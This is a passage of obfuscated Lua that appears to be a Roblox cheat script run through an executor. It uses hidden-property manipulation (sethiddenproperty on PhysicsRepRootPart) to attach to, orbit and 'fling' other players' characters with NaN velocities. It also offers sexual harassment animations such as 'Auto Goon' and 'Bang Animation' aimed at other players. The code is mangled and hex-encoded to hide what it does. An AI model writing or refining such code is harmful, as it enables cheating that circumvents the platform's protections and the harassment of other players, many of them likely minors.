 _llIllIlIlI = _IllIIlIlll(_lllIIllllI, false, Enum.AnimationPriority.Action4) if _llIllIlIlI then _llIllIlIlI.Stopped:Connect( function () if _llIllIlIlI then _llIllIlIlI:Destroy() _llIllIlIlI = nil end
 _lllIllIlIl = false _IlIllIlIlI() end
 ) end
 end
 local function _llIIlIIIIl(match) for _lIIlIllIlI, _lIllllllII in pairs(_llIlIIlIll.PlayerGui.Hotbar.Backpack.Hotbar:GetDescendants()) do if _lIllllllII.Name == "\084\111\111\108\078\097\109\101" and _lIllllllII.Text:match(match) then return _lIllllllII.Parent end
 end
 return nil end
 local function _IllllIIIll() local _IllIIIllll = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lIIlIIlllI.Character and _lIIlIIlllI.Character:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") then _IllIIIllll[_lIIlIIlllI] = true end
 end
 return _IllIIIllll end
 local function _lIIlIIIlll() if getgenv().InvisActive or getgenv().FUCActive then return end
 if _IllIlllIIl then _IllIlllIIl:Disconnect() _IllIlllIIl = nil end
 _IlIlllllll = not _IlIlllllll if _IlIlllllll then local _IIllIIlllI = _llIlIIlIll.Character local _IIIlllIIlI = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIlllIIlI and _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then _IlIlllllll = false return end
 _IIIIIllIIl() _lllIIlllII = _IIlIIIIIIl _lIIlllIlII.TPOSE_A.Track = _IlIIIllIII(_lIIlllIlII.TPOSE_A, _IIlIIIIIIl, Enum.AnimationPriority.Action3, 1e12) _IllIlllIIl = RunService.Heartbeat:Connect( function () if getgenv().InvisActive or getgenv().FUCActive then return end
 local _IlIlIllIll = _llIlIIlIll.Character local _lIlIIllIII = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIllllIlI = _lIlIIllIII and _lIlIIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IlIllllIlI then return end
 if _lllIIlllII ~= _IlIllllIlI then _IIIIIllIIl() _lllIIlllII = _IlIllllIlI _lIIlllIlII.TPOSE_A.Track = _IlIIIllIII(_lIIlllIlII.TPOSE_A, _IlIllllIlI, Enum.AnimationPriority.Action3, 1e12) return end
 local _IlIIIlIlll = _lIIlllIlII.TPOSE_A if not _IlIIIlIlll.Track or not _IlIIIlIlll.Track.IsPlaying then if _IlIIIlIlll.Track then pcall( function () _IlIIIlIlll.Track:Destroy() end
 ) end
 _IlIIIlIlll.Track = _IlIIIllIII(_IlIIIlIlll, _IlIllllIlI, Enum.AnimationPriority.Action3, 1e12) end
 end
 ) else _IIIIIllIIl() end
 end
 local _lIIlIllIII = nil local _IlllIIIIIl = nil local _IIllllllIl = nil local function _IIIlIlIlll() local _IIllIIlllI = _llIlIIlIll.Character if _IllIIlIllI then _IllIIlIllI = false if _IIIlIlIIIl then _IIIlIlIIIl:Disconnect() _IIIlIlIIIl = nil end
 if _lIIlIllIII then _lIIlIllIII:Disconnect() _lIIlIllIII = nil end
 if _IlllIIIIIl then _IlllIIIIIl:Disconnect() _IlllIIIIIl = nil end
 local _lllllIIlIl = _llIlIIlIll.Character local _lIlIllIlIl = _lllllIIlIl and _lllllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllIlIl then if sethiddenproperty then pcall( function () sethiddenproperty(_lIlIllIlIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) end
 if _lIllIlllll.target and _lIllIlllll.target.Parent then pcall( function () sethiddenproperty(_lIllIlllll.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIllIlllll.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.Velocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.RotVelocity = Vector3.zero end
 ) end
 _lIllIlllll.target = nil _lIllIlllll.player = nil local _IlllIIlIll = _lllllIIlIl and _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlllIIlIll then pcall( function () _IlllIIlIll.AutoRotate = true end
 ) pcall( function () _IlllIIlIll:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _lIIIIIIlll and _lIlIllIlIl then local _IIIllIIIIl = _lIIIIIIlll _lIIIIIIlll = nil task.spawn( function () for _lIIlIllIlI = 0x1, 0x4 do RunService.Heartbeat:Wait() _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) _lIlIllIlIl.CFrame = _IIIllIIIIl end
 end
 ) end
 pcall( function () _IllIlllIlI.Weld = true _llIIllIlll.TogWeld:SetValue(false) _IllIlllIlI.Weld = false end
 ) pcall( function () _lIIlIllIlI.KPWeld.Toggled = false end
 ) if not _IlllIlIlII and not _IIIllIIlll then _IIIIllIIlI() end
 _IIIllIIlll:Notify({ Title = _IlllIlIlII and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IlllIlIllI = 0x2 }) return end
 local _IlllIIIIll = false do local _IIllIIllII = workspace.CurrentCamera local _llIllIIIII = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIlllIlII = {} for _lIIlIllIlI, _lIIlIIlllI in ipairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do table.insert(_llIlllIlII, _lIIlIIlllI) end
 local _lIIlIIIIIl = workspace:FindFirstChild("\076\105\118\101") if _lIIlIIIIIl then for _lIIlIllIlI, _IllIIIllII in ipairs(_lIIlIIIIIl:GetChildren()) do if _IllIIIllII:IsA("\077\111\100\101\108") and _IllIIIllII:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_llIlllIlII, _IllIIIllII) end
 end
 end
 for _lIIlIllIlI, _IlIlIIIlII in ipairs(_llIlllIlII) do local _lllIllIIIl = (_IlIlIIIlII == _llIlIIlIll) or (typeof(_IlIlIIIlII) == "\073\110\115\116\097\110\099\101" and _IlIlIIIlII:IsA("\077\111\100\101\108") and _IlIlIIIlII == _llIlIIlIll.Character) if not _lllIllIIIl then local _lIIIIIlIll = (typeof(_IlIlIIIlII) == "\073\110\115\116\097\110\099\101" and _IlIlIIIlII:IsA("\080\108\097\121\101\114") and _IlIlIIIlII.Character) or _IlIlIIIlII if _lIIIIIlIll then local _lIlIIllIII = _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII and _lIlIIllIII.Health > 0x0 then _IlllIIIIll = true break end
 end
 end
 end
 end
 if not _IlllIIIIll then return end
 if not _IIllIIlllI then return end
 local _llIllIIIII = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIllIIIII then return end
 _IllIIlIllI = true _lIIIIIIlll = _llIllIIIII.CFrame _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIIIII) end
 ) end
 pcall( function () _IllIlllIlI.Weld = true _llIIllIlll.TogWeld:SetValue(true) _IllIlllIlI.Weld = false end
 ) pcall( function () _lIIlIllIlI.KPWeld.Toggled = true end
 ) local function _lIlIIIIlll() local _IIllIIllII = workspace.CurrentCamera local _IIllIlllIl = _IlllIIllII:GetMouseLocation() local _llIlllIllI = math.huge local _IllllIllII, bestRoot = nil, nil local _llIlllIlII = {} for _lIIlIllIlI, _lIIlIIlllI in ipairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do table.insert(_llIlllIlII, _lIIlIIlllI) end
 local _lIIlIIIIIl = workspace:FindFirstChild("\076\105\118\101") if _lIIlIIIIIl then for _lIIlIllIlI, _IllIIIllII in ipairs(_lIIlIIIIIl:GetChildren()) do if _IllIIIllII:IsA("\077\111\100\101\108") and _IllIIIllII:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_llIlllIlII, _IllIIIllII) end
 end
 end
 for _lIIlIllIlI, _IlIlIIIlII in ipairs(_llIlllIlII) do local _lllIllIIIl = (_IlIlIIIlII == _llIlIIlIll) or (typeof(_IlIlIIIlII) == "\073\110\115\116\097\110\099\101" and _IlIlIIIlII:IsA("\077\111\100\101\108") and _IlIlIIIlII == _llIlIIlIll.Character) if _lllIllIIIl then continue end
 local _lIIIIIlIll = (typeof(_IlIlIIIlII) == "\073\110\115\116\097\110\099\101" and _IlIlIIIlII:IsA("\080\108\097\121\101\114") and _IlIlIIIlII.Character) or _IlIlIIIlII if not _lIIIIIlIll then continue end
 local _lIlIIllIII = _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII or _lIlIIllIII.Health <= 0x0 then continue end
 local _lIlIllIlIl = _lIlIIllIII.RootPart or _lIIIIIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlIllIlIl then continue end
 if _lIlIIllIII.Health ~= 0x0 and workspace.CurrentCamera then local _lIIIllIIIl = workspace.CurrentCamera:WorldToViewportPoint(_lIlIllIlIl.Position) local _llIIIlIIIl = (Vector2.new(_lIIIllIIIl.X, _lIIIllIIIl.Y) - _IIllIlllIl).Magnitude if _llIIIlIIIl < _llIlllIllI then _llIlllIllI = _llIIIlIIIl _IllllIllII = _IlIlIIIlII bestRoot = _lIlIllIlIl end
 end
 end
 return bestRoot, _IllllIllII end
 local _IIllllIlIl, _lockedPlayer = _lIlIIIIlll() _lIllIlllll.target = _IIllllIlIl _lIllIlllll.player = _lockedPlayer if not _IIllllIlIl or not _lockedPlayer then _IllIIlIllI = false pcall( function () _IllIlllIlI.Weld = true _llIIllIlll.TogWeld:SetValue(false) _IllIlllIlI.Weld = false end
 ) pcall( function () _lIIlIllIlI.KPWeld.Toggled = false end
 ) local _lllllIIlIl = _llIlIIlIll.Character local _lIlIllIlIl = _lllllIIlIl and _lllllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllIlIl then _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) end
 return end
 local _IlllIllIll = nil local function _llIIIlllII() _IllIIlIllI = false if _IIIlIlIIIl then _IIIlIlIIIl:Disconnect() _IIIlIlIIIl = nil end
 if _lIIlIllIII then _lIIlIllIII:Disconnect() _lIIlIllIII = nil end
 pcall( function () if _IlllIIIIIl then _IlllIIIIIl:Disconnect() _IlllIIIIIl = nil if _IIllllllIl and _IIllllllIl.Parent then local _IlIIIlIlll = _IIllllllIl.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIlll then pcall( function () _IlIIIlIlll.AutoRotate = true end
 ) end
 end
 _IIllllllIl = nil end
 end
 ) local _lllllIIlIl = _llIlIIlIll.Character local _lIlIllIlIl = _lllllIIlIl and _lllllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllIlIl then if sethiddenproperty then pcall( function () sethiddenproperty(_lIlIllIlIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) end
 if _lIllIlllll.target and _lIllIlllll.target.Parent then pcall( function () sethiddenproperty(_lIllIlllll.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIllIlllll.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.Velocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.RotVelocity = Vector3.zero end
 ) end
 _lIllIlllll.target = nil _lIllIlllll.player = nil local _IIlIIIIIII = _lllllIIlIl and _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIlIIIIIII then pcall( function () _IIlIIIIIII.AutoRotate = true end
 ) pcall( function () _IIlIIIIIII:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _lIIIIIIlll and _lIlIllIlIl then local _IIIllIIIIl = _lIIIIIIlll _lIIIIIIlll = nil task.spawn( function () for _lIIlIllIlI = 0x1, 0x4 do RunService.Heartbeat:Wait() _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) _lIlIllIlIl.CFrame = _IIIllIIIIl end
 end
 ) end
 pcall( function () _IllIlllIlI.Weld = true _llIIllIlll.TogWeld:SetValue(false) _IllIlllIlI.Weld = false end
 ) pcall( function () _lIIlIllIlI.KPWeld.Toggled = false end
 ) if not _IlllIlIlII and not _IIIllIIlll then _IIIIllIIlI() end
 _IIIllIIlll:Notify({ Title = _IlllIlIlII and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IlllIlIllI = 0x2 }) end
 _lIIlIllIII = game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function (_lIIlIIlllI) if _lIIlIIlllI == _lockedPlayer then _llIIIlllII() end
 end
 ) if _IlllIlIlII then local _lIIllIIIll = 0x0 local _IIllllllIl = nil local function _IIlIIlllIl(_llIllIIIII, _lIlIIllIII) if _IlllIIIIIl then return end
 _IIllllllIl = _llIllIIIII _IlllIIIIIl = RunService.RenderStepped:Connect( function () if _lIlIIllIII and _lIlIIllIII.Parent then pcall( function () _lIlIIllIII.AutoRotate = false end
 ) end
 end
 ) end
 local function _lIlllIlIII() if _IlllIIIIIl then _IlllIIIIIl:Disconnect() _IlllIIIIIl = nil end
 if _IIllllllIl and _IIllllllIl.Parent then local _IlIIIlIlll = _IIllllllIl.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIlll then pcall( function () _IlIIIlIlll.AutoRotate = true end
 ) end
 end
 _IIllllllIl = nil end
 _IIIlIlIIIl = RunService.Heartbeat:Connect( function () if not _IllIIlIllI then return end
 local _lllllIIlIl = _llIlIIlIll.Character local _lIllIlllll = _lllllIIlIl and _lllllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lllllIIlIl or not _lIllIlllll then local _IIIlIIIIIl = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 return end
 if _lockedPlayer and _lockedPlayer.Parent then local _lIIlIIllll = (typeof(_lockedPlayer) == "\073\110\115\116\097\110\099\101" and _lockedPlayer:IsA("\080\108\097\121\101\114") and _lockedPlayer.Character) or _lockedPlayer if _lIIlIIllll then local _lIlIIllIlI = _lIIlIllIlI.AttachMethod and _lIIlIllIlI.AttachMethod.Value == "\072\105\116\098\111\120\032\065\099\099\117\114\097\116\101" local _IlIIIlIIlI if _lIlIIllIlI then local _lllIllllIl = _lIIlIIllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _IlIIIlIIlI = _lllIllllIl and _lllIllllIl.RootPart local _IIIIlIIlII = _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIIlIIlII then _IIlIIlllIl(_lIllIlllll, _IIIIlIIlII) end
 else if _IlllIIIIIl then _lIlllIlIII() end
 _IlIIIlIIlI = _lIIlIIllll:FindFirstChild("\085\112\112\101\114\084\111\114\115\111") or _lIIlIIllll:FindFirstChild("\084\111\114\115\111") or _lIIlIIllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") end
 if _IlIIIlIIlI then _IIllllIlIl = _IlIIIlIIlI _lIllIlllll.target = _IlIIIlIIlI end
 end
 if not _IIllllIlIl or not _IIllllIlIl.Parent then return end
 else _llIIIlllII() return end
 local _lIlIllIIlI = _lIIlIllIlI.AttachMethod and _lIIlIllIlI.AttachMethod.Value == "\079\114\098\105\116" if _lIlIllIIlI then local _IllIIIIIII = _lIIlIllIlI.AttachOrbitSpeed and _lIIlIllIlI.AttachOrbitSpeed.Value or 0xA local _lllIIllIII = _lIIlIllIlI.AttachOrbitDistance and _lIIlIllIlI.AttachOrbitDistance.Value or 0x3 _lIIllIIIll = _lIIllIIIll + _IllIIIIIII local _lIlIlIlIII = _IIllllIlIl.Position local _IllllIlIlI = CFrame.Angles(0x0, math.rad(_lIIllIIIll), 0x0) * CFrame.new(_lllIIllIII, 0x0, 0x0) local _llllllIIIl = _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llllllIIIl then local _lIllllIlIl = _IlllIIllII.MouseBehavior == Enum.MouseBehavior.LockCenter pcall( function () _llllllIIIl.AutoRotate = _lIllllIlIl end
 ) end
 local _IlllIlIIlI = CFrame.new(_lIlIlIlIII.X, _lIlIlIlIII.Y, _lIlIlIlIII.Z) * _IllllIlIlI local _lllllIIlll = CFrame.lookAt(_IlllIlIIlI.Position, Vector3.new(_lIlIlIlIII.X, _IlllIlIIlI.Position.Y, _lIlIlIlIII.Z)) _lIllIlllll.CFrame = _lllllIIlll _lIllIlllll.AssemblyLinearVelocity = Vector3.zero _lIllIlllll.AssemblyAngularVelocity = Vector3.zero pcall( function () sethiddenproperty(_lIllIlllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIllllIlIl) end
 ) else local _llIlIIIIIl = _lIIlIllIlI.WeldOffsetX and _lIIlIllIlI.WeldOffsetX.Value or 0x0 local _llIIlllIlI = _lIIlIllIlI.WeldOffsetY and _lIIlIllIlI.WeldOffsetY.Value or 0x0 local _IlIIlIIllI = _lIIlIllIlI.WeldOffsetZ and _lIIlIllIlI.WeldOffsetZ.Value or 0x0 _lIllIlllll.CFrame = _IIllllIlIl.CFrame * CFrame.new(_llIlIIIIIl, _llIIlllIlI, -_IlIIlIIllI) local _IIIlIllIII = _lIIIllIlIl and _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] and _lIIlIllIlI.TouchFlingMethod and _lIIlIllIlI.TouchFlingMethod.Value == "\068\101\097\116\104" if _IIIlIllIII then local _lIIIlIlIIl = 0x0/0x0 local _lIIIIIllIl = Vector3.new(_lIIIlIlIIl, _lIIIlIlIIl, _lIIIlIlIIl) _lIllIlllll.AssemblyLinearVelocity = _lIIIIIllIl _lIllIlllll.AssemblyAngularVelocity = _lIIIIIllIl else _lIllIlllll.AssemblyLinearVelocity = Vector3.zero _lIllIlllll.AssemblyAngularVelocity = Vector3.zero end
 local _llIlllIIIl = _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIlllIIIl then local _lIllllIlIl = _IlllIIllII.MouseBehavior == Enum.MouseBehavior.LockCenter pcall( function () _llIlllIIIl.AutoRotate = _lIllllIlIl end
 ) if _IIIlIllIII then pcall( function () local _IlllIlIIll = 0x0/0x0 sethiddenproperty(_llIlllIIIl, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", Vector3.new(_IlllIlIIll, _IlllIlIIll, _IlllIlIIll)) end
 ) end
 end
 pcall( function () sethiddenproperty(_lIllIlllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIllllIlIl) end
 ) end
 end
 ) else local _IIlIlllIIl = 0x0 if not _IIIllIIlll then _IIIIIlllll(_lockedPlayer) end
 task.spawn( function () while _IllIIlIllI do local _lIlllIIllI = _llIlIIlIll.Character local _lIIlIIIlll = _lIlllIIllI and _lIlllIIllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIIlIlIIlI = _lIlllIIllI and _lIlllIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lIIlIIllll = _lockedPlayer and _lockedPlayer.Character local _IIIlllIlll = _lIIlIIllll and _lIIlIIllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIlIlIIl = _lIIlIIllll and _lIIlIIllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlllIIllI and _lIIlIIIlll and _IIIlIlIIlI and _lockedPlayer and _lockedPlayer.Parent and _lIIlIIllll and _IIIlllIlll and _llIIlIlIIl then local _IllIIIIIII = _lIIlIllIlI.OrbitSpeed and _lIIlIllIlI.OrbitSpeed.Value or 0xA local _lllIIllIII = _lIIlIllIlI.OrbitDistance and _lIIlIllIlI.OrbitDistance.Value or 0x3 _IIlIlllIIl = _IIlIlllIIl + _IllIIIIIII local _IlIIIIlllI = _IIIlllIlll.Position + _llIIlIlIIl.MoveDirection * _IIIlllIlll.Velocity.Magnitude / 2.75 local _IllllIlIlI = CFrame.Angles(0x0, math.rad(_IIlIlllIIl), 0x0) * CFrame.new(_lllIIllIII, 0x0, 0x0) _lIIlIIIlll.CFrame = CFrame.lookAt(_lIIlIIIlll.Position, Vector3.new(_IlIIIIlllI.X, _lIIlIIIlll.Position.Y, _IlIIIIlllI.Z)) task.wait() _lIIlIIIlll.CFrame = CFrame.new(_IlIIIIlllI.X, _IIIlllIlll.Position.Y, _IlIIIIlllI.Z) * _IllllIlIlI elseif not _lockedPlayer or not _lockedPlayer.Parent then _llIIIlllII() break end
 RunService.RenderStepped:Wait() end
 end
 ) end
 _IIIllIIlll:Notify({ Title = _IlllIlIlII and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\110\032\9989", _IlllIlIllI = 0x2 }) end
 local function _IIlIlIIlll(elem, visible) if not elem then return end
 local _llllllllII = pcall( function () elem:SetVisible(visible) end
 ) if not _llllllllII then pcall( function () local _IIIlIIlIll = elem.Frame or elem.HolderFrame or elem.Container if _IIIlIIlIll then _IIIlIIlIll.Visible = visible end
 end
 ) end
 end
 local function _IIIIIIlIll() _IlIlIIlllI = RunService.Heartbeat:Connect( function () if not _llIIllIlll.TogHeadFloat.Value then return end
 if not _lIIlllIlII.L_KEY.IsActive then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _IIIlllIIlI = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIlllIIlI and _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 local _llIIIlIIIl = _lIIlllIlII.L_KEY if not _llIIIlIIIl.Track or not _llIIIlIIIl.Track.IsPlaying then if _llIIIlIIIl.Track then pcall( function () _llIIIlIIIl.Track:Destroy() end
 ) end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _llIIIlIIIl.Id _llIIIlIIIl.Track = _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) _llIIIlIIIl.Track.Priority = Enum.AnimationPriority.Action4 _llIIIlIIIl.Track.Looped = true _llIIIlIIIl.Track:AdjustWeight(1e13) _llIIIlIIIl.Track:Play() _llIIIlIIIl.Track:AdjustSpeed(_llIIIlIIIl.Speed) _llIIIlIIIl.Track.TimePosition = _llIIIlIIIl.StartTime end
 end
 ) end
 local function _IIlIIlIlll() if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 end
 local _llIlllllII = _llIlIIlIll.CharacterAdded:Connect( function () if _llllIlllll then _llllIlllll = false _IIIIllIIlI() if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 end
 if _IllIlllIIl then _IllIlllIIl:Disconnect() _IllIlllIIl = nil end
 for _lIIlIllIlI, _lllIIllllI in pairs(_lIIlllIlII) do _lllIIllllI.Track = nil end
 _IIlIIlIlll() _IlIlllllll = false local _IIllIIlIll = _lIIlllIlII.F2_KEY if _IIllIIlIll.Track then pcall( function () _IIllIIlIll.Track:Stop() end
 ) pcall( function () _IIllIIlIll.Track:Destroy() end
 ) _IIllIIlIll.Track = nil end
 local _lllllIllII = _lIIlllIlII.TPOSE_A if _lllllIllII.Track then pcall( function () _lllllIllII.Track:Stop() end
 ) pcall( function () _lllllIllII.Track:Destroy() end
 ) _lllllIllII.Track = nil end
 _lllIIlllII = nil _llIllIlIlI = nil _lllIllIlIl = false _llIlIIIIII = {} task.spawn(_lllllIlIII) end
 ) local _IIlIIIlllI = _llIlIIlIll.CharacterRemoving:Connect(_lIlIllllll) local _IllIlllIlI = {} local _IlIlllllIl = {} local _IlIIlIlIIl = _IIlIIlllIl:AddToggle("\084\111\103\072\101\097\100\070\108\111\097\116", { Text = "\072\101\097\100\032\070\108\111\097\116", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _lIllllllII = _lIIlIllIlI.SpamSpeed and _lIIlIllIlI.SpamSpeed.Value if _lIllllllII then _llIlIIllII = _lIllllllII end
 else if _lIIlIllIlI.KPHeadFloat then _lIIlIllIlI.KPHeadFloat.Toggled = false end
 _IIlIIlIlll() if _lIIlllIlII.L_KEY.IsActive then _IlllllllII(_lIIlllIlII.L_KEY) end
 end
 end
 , }) _IlIIlIlIIl:AddKeyPicker("\075\080\072\101\097\100\070\108\111\097\116", { Default = "\076", Text = "\072\101\097\100\032\070\108\111\097\116", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _llIIllIlll.TogHeadFloat.Value then _lIIlIllIlI.KPHeadFloat.Toggled = false return end
 if _IlIlIllIII() then return end
 _IlllllllII(_lIIlllIlII.L_KEY) end
 , }) do local _lIIlIIlIII = _IIlIIlllIl:AddDependencyBox() _lIIlIIlIII:AddSlider("\083\112\097\109\083\112\101\101\100", { Text = "\072\101\097\100\032\070\108\111\097\116\032\083\112\097\109\032\068\101\108\097\121", Default = 0.1, Min = 0.05, Max = 0x1, Rounding = 0x2, Callback = function (V) _llIlIIllII = V end
 }) _lIIlIIlIII:SetupDependencies({{ _IlIIlIlIIl, true }}) end
 local _lIIIIlIIll = _IIlIIlllIl:AddToggle("\084\111\103\074\101\114\107", { Text = "\065\117\116\111\032\071\111\111\110", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _lIllllllII = _lIIlIllIlI.JerkSpeed and _lIIlIllIlI.JerkSpeed.Value if _lIllllllII then _lIIlllIlII.JERK.Speed = _lIllllllII end
 else if _lIIlIllIlI.KPJerk then _lIIlIllIlI.KPJerk.Toggled = false end
 if _lIIlllIlII.JERK.IsActive then _IlllllllII(_lIIlllIlII.JERK) end
 end
 end
 , }) _lIIIIlIIll:AddKeyPicker("\075\080\074\101\114\107", { Default = "\074", Text = "\065\117\116\111\032\071\111\111\110", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _llIIllIlll.TogJerk.Value then _lIIlIllIlI.KPJerk.Toggled = false return end
 if _IlIlIllIII() then return end
 _IlllllllII(_lIIlllIlII.JERK) end
 , }) do local _lIIlIIlIII = _IIlIIlllIl:AddDependencyBox() _lIIlIIlIII:AddSlider("\074\101\114\107\083\112\101\101\100", { Text = "\065\117\116\111\032\071\111\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0x0, Max = 0xA, Rounding = 0x1, Callback = function (V) _lIIlllIlII.JERK.Speed = V if _lIIlllIlII.JERK.Track then _lIIlllIlII.JERK.Track:AdjustSpeed(V) end
 end
 }) _lIIlIIlIII:SetupDependencies({{ _lIIIIlIIll, true }}) end
 local _IIllllIIlI = _IIlIIlllIl:AddToggle("\084\111\103\066\097\110\103", { Text = "\066\097\110\103\032\065\110\105\109\097\116\105\111\110", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _lIllllllII = _lIIlIllIlI.BangSpeed and _lIIlIllIlI.BangSpeed.Value if _lIllllllII then _lIIlllIlII.BANG.Speed = _lIllllllII end
 else if _lIIlIllIlI.KPBang then _lIIlIllIlI.KPBang.Toggled = false end
 if _lIIlllIlII.BANG.IsActive then _IlllllllII(_lIIlllIlII.BANG) end
 end
 end
